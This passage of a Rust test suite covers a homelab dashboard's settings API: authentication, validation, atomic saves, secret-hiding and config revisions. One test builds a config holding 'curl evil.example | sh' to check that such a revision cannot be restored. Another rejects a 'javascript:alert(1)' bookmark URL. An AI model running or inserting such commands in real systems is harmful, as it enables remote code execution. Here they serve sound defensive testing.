        &st2,
        "config",
        json!({"base_hash": hash(&off), "text": FIXTURE}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN, "{b}");
    assert!(b["error"].as_str().unwrap().contains("enables"));
    assert_eq!(file(&dir2), off);
    // validate reports the guard too.
    let (s, b) = post(&st2, "config/validate", json!({"text": FIXTURE})).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["ok"], false);
    assert_eq!(b["locked"], true);

    // Allowed: unrelated edit keeps the command widget.
    let t = FIXTURE.replace("title = \"homelab\"", "title = \"box\"");
    let (s, b) = post(&st, "config", json!({"base_hash": h, "text": t})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["note"], "raw edit");
    assert_eq!(file(&dir), t);
    assert!(widget_ids(&t).contains(&"procs".to_string()));
    // Allowed: deleting the command widget.
    let start = t.find("[[widgets]]\nid = \"procs\"").unwrap();
    let end = t.find("# Deliberately broken").unwrap();
    let without = format!("{}{}", &t[..start], &t[end..]);
    let (s, b) = post(
        &st,
        "config",
        json!({"base_hash": hash(&t), "text": without}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert!(!widget_ids(&file(&dir)).contains(&"procs".to_string()));
    // And it cannot be put back from the app.
    let (s, _) = post(
        &st,
        "config",
        json!({"base_hash": hash(&without), "text": t}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
}

// ------------------------------------------------------------ pipeline

#[tokio::test]
async fn unauthenticated_requests_are_refused() {
    let (dir, st) = state_with(Some(FIXTURE));
    for path in [
        "/api/settings/config",
        "/api/settings/general",
        "/api/settings/widgets",
        "/api/settings/notifications",
        "/api/settings/env",
        "/api/settings/revisions",
        "/api/settings/security",
        "/api/settings/nope",
    ] {
        let req = hyper::Request::get(path)
            .body(Full::new(Bytes::new()))
            .unwrap();
        let resp = super::route(&st, req).await;
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED, "{path}");
        let body = resp.into_body().collect().await.unwrap().to_bytes();
        assert!(!String::from_utf8_lossy(&body).contains("homelab"));
    }
    // Writes are refused by the auth guard as well (defense in depth).
    let body = json!({"base_hash": hash(FIXTURE), "page": {"title": "x"}}).to_string();
    let req = hyper::Request::post("/api/settings/general")
        .body(Full::new(Bytes::from(body)))
        .unwrap();
    let resp = super::route(&st, req).await;
    assert!(resp.status() == StatusCode::FORBIDDEN || resp.status() == StatusCode::UNAUTHORIZED);
    assert_eq!(file(&dir), FIXTURE);
}

#[tokio::test]
async fn invalid_input_is_never_written() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": h, "page": {"columns": 9}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "columns");
    assert_eq!(file(&dir), FIXTURE);

    let bad = FIXTURE.replace("remote = true", "remote = = true");
    let (s, b) = post(&st, "config", json!({"base_hash": h, "text": bad})).await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(b["line"], 10, "{b}");
    assert!(b["col"].as_u64().is_some());
    assert_eq!(file(&dir), FIXTURE);

    let (s, b) = post(&st, "config/validate", json!({"text": bad})).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["ok"], false);
    assert_eq!(b["line"], 10);
    let (_, b) = post(&st, "config/validate", json!({"text": FIXTURE})).await;
    assert_eq!(b["ok"], true);

    // A widget that does not validate (unknown template field).
    let mut w = mailpit2();
    w["template"] = json!("{{nope}}");
    let (s, b) = post(
        &st,
        "widgets",
        json!({"base_hash": h, "action": "add", "item": w}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "template");
    assert_eq!(file(&dir), FIXTURE);

    // Malformed JSON and unknown endpoint.
    let (s, _) = call(&st, Method::POST, "general", None).await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    let (s, _) = get(&st, "nope").await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

/// Form errors land on the field that caused them, in plain words, without
/// the config file's line and column (SET-06, SET-07, SET-61).
#[tokio::test]
async fn form_errors_name_their_field_in_plain_words() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let mut w = mailpit2();
    w["refresh"] = json!("abc");
    let (s, b) = post(
        &st,
        "widgets",
        json!({"base_hash": h, "action": "add", "item": w}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "refresh", "{b}");
    assert_eq!(b["error"], "Use a duration like 30s or 5m.");
    assert!(b["line"].is_null(), "{b}");
    for (v, msg) in [
        ("abc", "Use a duration like 30s or 5m."),
        ("1s", "Use a value from 5s to 5m."),
    ] {
        let (s, b) = post(
            &st,
            "history",
            json!({"base_hash": h, "history": {"sample_interval": v}}),
        )
        .await;
        assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
        assert_eq!(b["field"], "sample_interval", "{v}: {b}");
        assert_eq!(b["error"], msg, "{v}: {b}");
        assert!(b["line"].is_null() && b["col"].is_null(), "{b}");
    }
    let (_, b) = post(
        &st,
        "general",
        json!({"base_hash": h, "page": {"columns": 9}}),
    )
    .await;
    assert_eq!(
        (&b["field"], &b["error"]),
        (&json!("columns"), &json!("Use a number from 1 to 6."))
    );
    let (_, b) = post(
        &st,
        "containers/override",
        json!({"base_hash": h, "names": ["web"], "set": {"order": 1.5}}),
    )
    .await;
    assert_eq!(
        (&b["field"], &b["error"]),
        (&json!("order"), &json!("Use a whole number.")),
        "{b}"
    );
    // Bookmarks: an add with a bad link is refused on the URL field.
    let (s, b) = post(
        &st,
        "bookmarks",
        json!({"base_hash": h, "action": "add", "item": {"name": "Docs", "url": "javascript:alert(1)"}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(b["field"], "url");
    assert_eq!(file(&dir), FIXTURE, "nothing was written");
}

/// A hand-written bookmark whose URL is not a web link stays editable as
/// long as the URL is not changed; a changed URL and an add are checked.
#[test]
fn bookmark_url_check_skips_an_unchanged_url_on_edit() {
    let text = "[[bookmarks]]\nname = \"Files\"\nurl = \"/files\"\n";
    let edit = |url: &str| {
        list_req(
            "edit",
            Some(json!(0)),
            Some(json!({"name": "Shared files", "url": url})),
            None,
        )
    };
    let d = ops::list_action(&cur(text), &ops::BOOKMARKS, &edit("/files")).unwrap();
    assert!(
        d.text.contains("Shared files") && d.text.contains("/files"),
        "{}",
        d.text
    );
    let e = ops::list_action(&cur(text), &ops::BOOKMARKS, &edit("/other")).unwrap_err();
    assert_eq!(e.body["field"], "url");
    let add = list_req(
        "add",
        None,
        Some(json!({"name": "x", "url": "/files"})),
        None,
    );
    let e = ops::list_action(&cur(text), &ops::BOOKMARKS, &add).unwrap_err();
    assert_eq!(e.body["field"], "url");
}

#[test]
fn plain_words_and_the_key_at_a_column() {
    assert_eq!(
        ops::plain("invalid duration \"x\""),
        "Use a duration like 30s or 5m."
    );
    assert_eq!(
        ops::plain("invalid type: floating point `1.5`, expected i32"),
        "Use a whole number."
    );
    assert_eq!(ops::plain("something else"), "something else");
    let d = |text: &str| store::Draft {
        text: text.into(),
        note: String::new(),
        kind: "config.saved",
        fields: ops::BOOKMARK_KEYS,
        warnings: vec![],
    };
    assert!(ops::precheck(d("[[bookmarks]]\nname = \"a\"\nurl = \"https://a\"\n")).is_ok());
    // The key before a column: a plain line, an inline table, none.
    assert_eq!(ops::key_before("refresh = \"abc\"", 11), Some("refresh"));
    let inline = "{ name = \"x\", url = \"bad\" }";
    let col = inline.find("\"bad").unwrap() + 1;
    assert_eq!(ops::key_before(inline, col), Some("url"));
    let col = inline.find("\"x").unwrap() + 1;
    assert_eq!(ops::key_before(inline, col), Some("name"));
    assert_eq!(ops::key_before("no equals here", 5), None);
    assert_eq!(ops::key_before("= 1", 3), None);
}

/// Change password: a wrong current password or a short new one is a 422
/// on that field; the password itself is never echoed.
#[tokio::test]
async fn password_errors_land_on_their_field() {
    let (_dir, st) = state_with(Some(FIXTURE));
    assert!(st.db.is_enabled(), "this test needs the history database");
    crate::auth::set_password_for_tests(&st.db, "old password 1");
    let (s, b) = post(
        &st,
        "security/password",
        json!({"current": "not it at all", "new": "new password 1"}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "current");
    assert_eq!(b["error"], "The current password is wrong.");
    assert!(!b.to_string().contains("not it at all"));
    let (s, b) = post(
        &st,
        "security/password",
        json!({"current": "old password 1", "new": "short"}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "new");
    assert!(!b.to_string().contains("short\""), "{b}");
}

#[tokio::test]
async fn stale_hash_is_refused() {
    let (dir, st) = state_with(Some(FIXTURE));
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": "0000", "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    assert_eq!(b["error"], "config changed on disk; reload");
    // A hand edit after the form was loaded is never overwritten.
    let (_, g) = get(&st, "general").await;
    let loaded = g["hash"].as_str().unwrap().to_string();
    let hand = FIXTURE.replace("homelab", "hand-edited");
    std::fs::write(dir.join("config.toml"), &hand).unwrap();
    let (s, _) = post(
        &st,
        "general",
        json!({"base_hash": loaded, "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    let (s, _) = post(&st, "config", json!({"base_hash": loaded, "text": FIXTURE})).await;
    assert_eq!(s, StatusCode::CONFLICT);
    assert_eq!(file(&dir), hand);
}

#[tokio::test]
async fn save_is_atomic_keeps_mode_and_reloads() {
    use std::os::unix::fs::PermissionsExt;
    let (dir, st) = state_with(Some(FIXTURE));
    let path = dir.join("config.toml");
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o640)).unwrap();
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": hash(FIXTURE), "page": {"title": "saved"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["ok"], true);
    assert_eq!(b["note"], "general");
    assert_eq!(b["hash"].as_str().unwrap(), hash(&file(&dir)));
    let names: Vec<String> = std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        // The history database lives in the data dir too; not a temp file.
        .filter(|n| !n.starts_with("hobnail.db"))
        .collect();
    assert_eq!(names, ["config.toml"], "no temp files left behind");
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o640);
    assert_eq!(st.config.current().page.title.as_deref(), Some("saved"));
    // Same content again: no write.
    let (_, b2) = post(
        &st,
        "general",
        json!({"base_hash": b["hash"], "page": {"title": "saved"}}),
    )
    .await;
    assert_eq!(b2["unchanged"], true);
}

#[test]
fn write_atomic_failure_leaves_target_and_no_temp() {
    let dir = tmp_dir();
    let target = dir.join("sub").join("missing").join("x.toml");
    assert!(doc::write_atomic(&target, b"x", 0o644).is_err());
    let path = dir.join("a.toml");
    std::fs::write(&path, "old").unwrap();
    doc::write_atomic(&path, b"new", 0o644).unwrap();
    assert_eq!(std::fs::read_to_string(&path).unwrap(), "new");
    assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 1);
}

#[tokio::test]
async fn missing_config_file_can_be_created() {
    let (dir, st) = state_with(None);
    let (s, g) = get(&st, "config").await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(g["exists"], false);
    assert_eq!(g["hash"], hash(""));
    let (s, b) = post(
        &st,
        "bookmarks",
        json!({"base_hash": hash(""), "action": "add",
        "item": {"name": "GitHub", "url": "https://github.com"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(parse_ok(&file(&dir)).bookmarks.len(), 1);
}

// ------------------------------------------------------------ secrets

#[test]
fn secret_value_warnings() {
    let slack = "[channels.h]\ntype = \"webhook\"\nurl = \"https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX\"\n";
    let w = guard::secret_warnings("", slack);
    assert_eq!(w.len(), 1);
    assert!(w[0].starts_with("line 3:"));
    assert!(w[0].contains("Slack"));
    assert!(!w[0].contains("XXXX"), "a warning never repeats the secret");
    // Already there: no new warning.
    assert!(guard::secret_warnings(slack, slack).is_empty());
    // A Telegram bot token, even in a comment.
    let tg = "# token 123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw0\n";
    let w = guard::secret_warnings("", tg);
    assert_eq!(w.len(), 1);
    assert!(w[0].contains("Telegram") && !w[0].contains("AAHdq"));
    // No false positives on the fixture (host:port URLs, durations).
    assert!(guard::secret_warnings("", FIXTURE).is_empty());
    assert!(guard::secret_warnings(
        "",
        "a = \"12:30\"\nb = \"x1234:abcdefghijklmnopqrstuvwxyz0123456789\"\n"
    )
    .is_empty());
}

#[tokio::test]
async fn raw_save_with_a_secret_warns_but_saves() {
    let (dir, st) = state_with(Some(FIXTURE));
    let t = format!("{FIXTURE}\n[channels.h]\ntype = \"webhook\"\nurl = \"https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX\"\n");
    let (s, b) = post(
        &st,
        "config",
        json!({"base_hash": hash(FIXTURE), "text": t}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["warnings"].as_array().unwrap().len(), 1);
    assert!(!b.to_string().contains("XXXXXXXX"));
    assert_eq!(file(&dir), t);
}

#[test]
fn env_var_names() {
    for ok in ["RH_SLACK_WEBHOOK_URL", "_X", "A1", "TOKEN"] {
        assert!(guard::valid_env_name(ok), "{ok}");
    }
    for bad in [
        "",
        "1A",
        "lower",
        "A-B",
        "A B",
        "https://hooks.slack.com/x",
        "A=B",
        "Ä",
    ] {
        assert!(!guard::valid_env_name(bad), "{bad}");
    }
    assert!(!guard::valid_env_name(&"A".repeat(129)));
}

#[tokio::test]
async fn gets_show_env_names_never_values() {
    std::env::set_var("RH_SETTINGS_TEST_SET", "super-secret-value");
    let text = format!(
        "{FIXTURE}\n[channels.slack]\ntype = \"slack\"\nwebhook_url_env = \"RH_SETTINGS_TEST_SET\"\n\n\
         [channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_SETTINGS_TEST_UNSET\"\nchat_id = 1\n"
    );
    let text = text.replace(
        "enabled = true\nrefresh = \"15s\"",
        "enabled = true\nrefresh = \"15s\"\nenv = { API_KEY = \"hunter2\" }",
    );
    let (_, st) = state_with(Some(&text));
    let (s, n) = get(&st, "notifications").await;
    assert_eq!(s, StatusCode::OK, "{n}");
    let all = n.to_string();
    assert!(!all.contains("super-secret-value"));
    let slack = n["channels"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "slack")
        .unwrap();
    assert_eq!(slack["secrets"][0]["name"], "RH_SETTINGS_TEST_SET");
    assert_eq!(slack["secrets"][0]["set"], true);
    let tg = n["channels"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "tg")
        .unwrap();
    assert_eq!(tg["secrets"][0]["set"], false);
    let (_, e) = get(&st, "env").await;
    assert!(!e.to_string().contains("super-secret-value"));
    assert_eq!(e["vars"].as_array().unwrap().len(), 2);

    let (s, w) = get(&st, "widgets").await;
    assert_eq!(s, StatusCode::OK, "{w}");
    let procs = w["widgets"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["id"] == "procs")
        .unwrap();
    assert_eq!(procs["locked"], true);
    assert_eq!(procs["item"]["env_names"], json!(["API_KEY"]));
    assert!(!w.to_string().contains("hunter2"));
    let beszel = w["widgets"]
        .as_array()
        .unwrap()
        .iter()
        .find(|x| x["id"] == "beszel")
        .unwrap();
    assert_eq!(beszel["locked"], false);
    assert_eq!(beszel["item"]["url"], "http://100.64.0.10:8090/api/health");
}

// ------------------------------------------------------------ other tabs

#[tokio::test]
async fn gets_return_hash_and_values() {
    let (_, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    for path in [
        "general",
        "containers",
        "bookmarks",
        "widgets",
        "notifications",
        "history",
        "config",
        "meta",
    ] {
        let (s, b) = get(&st, path).await;
        assert_eq!(s, StatusCode::OK, "{path}: {b}");
        assert_eq!(b["hash"], h, "{path}");
    }
    let (_, g) = get(&st, "general").await;
    assert_eq!(g["page"]["title"], "homelab");
    assert_eq!(g["defaults"]["columns"], 4);
    let (_, c) = get(&st, "config").await;
    assert_eq!(c["text"], FIXTURE);
    assert_eq!(c["valid"]["ok"], true);
    let (s, r) = get(&st, "revisions").await;
    assert_eq!(s, StatusCode::OK);
    assert!(r["revisions"].is_array());
    let (s, x) = get(&st, "history/export").await;
    assert_eq!(s, StatusCode::OK);
    assert!(x["events"].is_array());
    let (s, sec) = get(&st, "security").await;
    assert_eq!(s, StatusCode::OK);
    assert!(sec["recent_logins"].is_array());
}

#[tokio::test]
async fn form_tabs_refuse_a_broken_file() {
    let broken = "[page\n";
    let (dir, st) = state_with(Some(broken));
    let (s, b) = get(&st, "general").await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(b["file_invalid"], true);
    let (s, _) = post(
        &st,
        "general",
        json!({"base_hash": hash(broken), "page": {"title": "x"}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY);
    // The raw editor still works and can fix it.
    let (s, c) = get(&st, "config").await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(c["valid"]["ok"], false);
    let (s, _) = post(
        &st,
        "config",
        json!({"base_hash": hash(broken), "text": "[page]\n"}),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(file(&dir), "[page]\n");
}

#[tokio::test]
async fn custom_css_editor() {
    let (dir, st) = state_with(Some(FIXTURE));
    let (_, g) = get(&st, "appearance").await;
    assert_eq!(g["css"], "");
    let (s, b) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": ":root { --accent: red; }"}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(
        std::fs::read_to_string(dir.join("custom.css")).unwrap(),
        ":root { --accent: red; }"
    );
    let (s, _) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": "x"}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    let (s, _) = post(
        &st,
        "appearance",
        json!({"base_hash": b["hash"], "css": "a".repeat(64 * 1024 + 1)}),
    )
    .await;
    assert_eq!(s, StatusCode::PAYLOAD_TOO_LARGE);
    let mut names: Vec<String> = std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        // The history database lives in the data dir too; not a temp file.
        .filter(|n| !n.starts_with("hobnail.db"))
        .collect();
    names.sort();
    assert_eq!(names, ["config.toml", "custom.css"]);
}

#[tokio::test]
async fn preview_respects_allow_hosts() {
    let text = "[http]\nallow_hosts = [\"example.invalid\"]\n";
    let (_, st) = state_with(Some(text));
    let item =
        json!({"id": "p", "type": "custom-api", "url": "http://127.0.0.1:9/x", "timeout": "1s"});
    let (s, b) = post(&st, "widgets/preview", json!({"item": item})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["ok"], false);
    assert!(b["error"].as_str().unwrap().contains("allow_hosts"), "{b}");
    let bad = json!({"id": "p", "type": "custom-api", "url": "ftp://x"});
    let (s, b) = post(&st, "widgets/preview", json!({"item": bad})).await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(b["field"], "url");
}

#[tokio::test]
async fn channel_test_needs_a_saved_channel() {
    let (_, st) = state_with(Some(FIXTURE));
    let (s, _) = post(&st, "channels/test", json!({"name": "nope"})).await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn history_writes_go_through_the_validator() {
    // `[history]` is validated by config::parse (its keys come from the
    // storage work); whatever it refuses is never written.
    let (dir, st) = state_with(Some(FIXTURE));
    let (s, b) = post(
        &st,
        "history",
        json!({"base_hash": hash(FIXTURE), "history": {"no_such_key": 1}}),
    )
    .await;
    assert_eq!(s, StatusCode::UNPROCESSABLE_ENTITY, "{b}");
    assert_eq!(file(&dir), FIXTURE);
    let (s, b) = post(&st, "history/clear", json!({})).await;
    assert_eq!(s, StatusCode::OK, "{b}");
}

// ------------------------------------------------------------ revisions

/// Revisions need the real database (storage work). Skipped while
/// `Db::open_in_memory()` is the disabled stub.
fn state_with_db(text: &str) -> Option<(PathBuf, Arc<AppState>)> {
    let (dir, mut st) = state_with(Some(text));
    let db = crate::db::Db::open_in_memory().ok()?;
    if !db.is_enabled() {
        eprintln!("skipped: the history database is a disabled stub");
        return None;
    }
    Arc::get_mut(&mut st)?.db = Arc::new(db);
    Some((dir, st))
}

#[tokio::test]
async fn revisions_record_restore_and_diff() {
    let Some((dir, st)) = state_with_db(FIXTURE) else {
        return;
    };
    let h0 = hash(FIXTURE);
    let (s, b) = post(
        &st,
        "general",
        json!({"base_hash": h0, "page": {"title": "one"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    let first = b["revision"].as_i64().expect("revision id");
    let (_, r) = get(&st, "revisions").await;
    let list = r["revisions"].as_array().unwrap();
    assert_eq!(list.len(), 2, "{r}");
    assert_eq!(list[0]["note"], "general");
    assert_eq!(list[1]["note"], "before first in-app edit");
    let orig = list[1]["id"].as_i64().unwrap();
    let (_, t) = get(&st, &format!("revision/{orig}")).await;
    assert_eq!(t["text"], FIXTURE);
    let (_, d) = get(&st, &format!("revision/{orig}/diff")).await;
    assert_eq!(
        (d["added"].as_u64(), d["removed"].as_u64()),
        (Some(1), Some(1)),
        "{d}"
    );
    // Restore creates a new revision.
    let h1 = hash(&file(&dir));
    let (s, b) = post(
        &st,
        &format!("revision/{orig}/restore"),
        json!({"base_hash": h1}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(b["note"], format!("restored #{orig}"));
    assert!(b["revision"].as_i64().unwrap() > first);
    assert_eq!(file(&dir), FIXTURE);
    // Stale restore refused.
    let (s, _) = post(
        &st,
        &format!("revision/{first}/restore"),
        json!({"base_hash": h1}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
}

#[tokio::test]
async fn restoring_a_revision_with_another_command_widget_is_refused() {
    let Some((dir, st)) = state_with_db(FIXTURE) else {
        return;
    };
    let evil = FIXTURE.replace("printf", "curl evil.example | sh; printf");
    let id = st.db.add_revision(1, "file", "old", &evil).unwrap();
    let (s, b) = post(
        &st,
        &format!("revision/{id}/restore"),
        json!({"base_hash": hash(FIXTURE)}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN, "{b}");
    assert_eq!(file(&dir), FIXTURE);
}

#[tokio::test]
async fn revision_endpoints_without_a_database() {
    let (_, st) = state_with(Some(FIXTURE));
    if st.db.is_enabled() {
        return;
    }
    let (s, _) = get(&st, "revision/1").await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, _) = post(
        &st,
        "revision/1/restore",
        json!({"base_hash": hash(FIXTURE)}),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, _) = get(&st, "revision/x").await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

// ------------------------------------------------------------ diff

fn lcs_len(a: &[u8], b: &[u8]) -> usize {
    let mut dp = vec![vec![0usize; b.len() + 1]; a.len() + 1];
    for i in 0..a.len() {
        for j in 0..b.len() {
            dp[i + 1][j + 1] = if a[i] == b[j] {
                dp[i][j] + 1
            } else {
                dp[i][j + 1].max(dp[i + 1][j])
            };
        }
    }
    dp[a.len()][b.len()]
}

/// Apply an edit script: the result must be `b`, and the old indices in
/// order must cover `a`.
fn check_script(a: &[u8], b: &[u8], ops: &[diff::Op]) {
    let mut out = Vec::new();
    let (mut ai, mut bi) = (0, 0);
    for o in ops {
        match *o {
            diff::Op::Eq(x, y) => {
                assert_eq!((x, y), (ai, bi));
                assert_eq!(a[x], b[y]);
                out.push(b[y]);
                ai += 1;
                bi += 1;
            }
            diff::Op::Del(x) => {
                assert_eq!(x, ai);
                ai += 1;
            }
            diff::Op::Ins(y) => {
                assert_eq!(y, bi);
                out.push(b[y]);
                bi += 1;
            }
        }
    }
    assert_eq!((ai, bi), (a.len(), b.len()));
    assert_eq!(out, b);
}

#[test]
fn diff_is_correct_and_minimal() {
    // Deterministic pseudo-random inputs over a tiny alphabet.
    let mut seed = 0x2545_f491_4f6c_dd1du64;
    let mut next = || {
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        seed
    };
    for _ in 0..400 {
        let la = (next() % 14) as usize;
        let lb = (next() % 14) as usize;
        let a: Vec<u8> = (0..la).map(|_| b'a' + (next() % 3) as u8).collect();
        let b: Vec<u8> = (0..lb).map(|_| b'a' + (next() % 3) as u8).collect();
        let (ops, approx) = diff::diff(&a, &b);
        assert!(!approx);
        check_script(&a, &b, &ops);
        let eq = ops.iter().filter(|o| matches!(o, diff::Op::Eq(..))).count();
        assert_eq!(eq, lcs_len(&a, &b), "{:?} {:?}", a, b);
    }
}

#[test]
fn diff_falls_back_when_too_different() {
    let a: Vec<u32> = (0..1500).collect();
    let b: Vec<u32> = (2000..3500).collect();
    let (ops, approx) = diff::diff(&a, &b);
    assert!(approx);
    assert_eq!(ops.len(), 3000);
}

#[test]
fn diff_hunks() {
    let old = "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\n";
    let new = "a\nB\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\n";
    let v = diff::hunks_json(old, new);
    assert_eq!(v["added"], 2);
    assert_eq!(v["removed"], 1);
    let hunks = v["hunks"].as_array().unwrap();
    assert_eq!(hunks.len(), 2, "{v}");
    assert_eq!(hunks[0]["old_start"], 1);
    assert_eq!(hunks[0]["lines"][1], json!({"op": "-", "text": "b"}));
    assert_eq!(hunks[0]["lines"][2], json!({"op": "+", "text": "B"}));
    assert_eq!(hunks[1]["new_start"], 9);
    assert_eq!(
        hunks[1]["lines"].as_array().unwrap().last().unwrap()["text"],
        "l"
    );
    let same = diff::hunks_json(old, old);
    assert_eq!(same["hunks"], json!([]));
    let from_empty = diff::hunks_json("", "x\n");
    assert_eq!(from_empty["hunks"][0]["old_start"], 0);
    assert_eq!(from_empty["hunks"][0]["new_start"], 1);
}

#[test]
fn diff_endpoint_caps_input() {
    let big = "x\n".repeat(diff::MAX_LINES + 1);
    let e = api::diff_json(&big, "", 1).unwrap_err();
    assert_eq!(e.status, StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(
        api::diff_json("a\n", "b\n", 3).unwrap()["to"],
        "revision #3"
    );
}

// ------------------------------------------------------------ small parts

#[test]
fn error_splitting_and_fields() {
    assert_eq!(
        store::split_error("config.toml:3:7: expected `=`"),
        ("expected `=`".to_string(), Some((3, 7)))
    );
    assert_eq!(
        store::split_error("config.toml: page.columns must be 1..=6, got 9"),
        ("page.columns must be 1..=6, got 9".to_string(), None)
    );
    let f = |m: &str| store::field_in(m, ops::WIDGET_KEYS);
    assert_eq!(
        f("widget \"x\": url must be a valid http:// or https:// URL").as_deref(),
        Some("url")
    );
    assert_eq!(
        f("widget \"x\": refresh must be at least 1s").as_deref(),
        Some("refresh")
    );
    assert_eq!(f("nothing here"), None);
    assert_eq!(
        store::field_in("headers_env.X must be", ops::WIDGET_KEYS).as_deref(),
        Some("headers_env")
    );
}

#[test]
fn percent_decoding() {
    assert_eq!(super::percent_decode("odoo%2Dup"), "odoo-up");
    assert_eq!(super::percent_decode("a%2"), "a%2");
    assert_eq!(super::percent_decode("%zz"), "%zz");
    assert_eq!(super::percent_decode("%C3%A4"), "ä");
}

#[test]
fn log_match_rules_can_be_added_from_the_form() {
    let req = list_req(
        "add",
        None,
        Some(
            json!({"name": "errs", "type": "log_match", "pattern": "ERROR", "containers": ["web"], "count": 3, "window": "5m"}),
        ),
        None,
    );
    let d = ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert!(c.alerts.iter().any(|r| r.name == "errs"));
}

const USED: &str = r#"[[widgets]]
id = "w1"
type = "custom-api"
url = "http://w.example/api"
[widgets.fields]
v = "v"

[channels.hook]
type = "webhook"
url_env = "RH_HOOK"

[channels.spare]
type = "webhook"
url_env = "RH_SPARE"

[[alerts]]
name = "watch-w1"
type = "widget"
widget = "w1"   # keep this comment
field = "v"
above = 1
channels = ["hook"]
"#;

/// A channel or widget that a rule still uses is not deleted: a 422 in
/// plain words naming the rules (no raw validator text), with `used_by`.
#[test]
fn deleting_what_a_rule_uses_names_the_rules() {
    parse_ok(USED);
    let req = list_req("delete", Some(json!("hook")), None, None);
    let e = ops::channel_action(&cur(USED), &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(e.body["field"].is_null());
    assert_eq!(
        e.body["error"],
        "The channel “hook” is used by the rule “watch-w1”. Take it out of those rules first (or delete them), then delete the channel."
    );
    assert_eq!(e.body["used_by"], json!(["watch-w1"]));
    // An unused one goes.
    let req = list_req("delete", Some(json!("spare")), None, None);
    let d = ops::channel_action(&cur(USED), &req).unwrap();
    assert!(!d.text.contains("spare") && parse_ok(&d.text).channels.len() == 1);
    // A widget a rule watches.
    let req = list_req("delete", Some(json!("w1")), None, None);
    let e = ops::list_action(&cur(USED), &ops::WIDGETS, &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(e.body["error"]
        .as_str()
        .unwrap()
        .starts_with("The widget “w1” is used by the rule “watch-w1”."));
    assert!(!e.body.to_string().contains("unknown widget"));
}

